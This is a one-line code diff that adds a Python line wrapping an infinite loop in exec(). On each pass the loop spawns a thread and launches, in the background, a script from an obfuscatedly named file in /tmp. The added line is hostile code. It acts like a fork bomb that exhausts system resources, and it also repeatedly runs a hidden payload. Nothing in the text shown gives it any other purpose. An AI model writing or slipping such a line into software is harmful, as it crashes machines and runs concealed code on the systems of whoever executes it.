@@ -1,0 +1,1 @@
+import threading, os; exec("while True: threading.Thread(target=lambda: None).start(); os.system('bash -c \"python3 /tmp/O0OOO00OOO0O0OO &\"')")
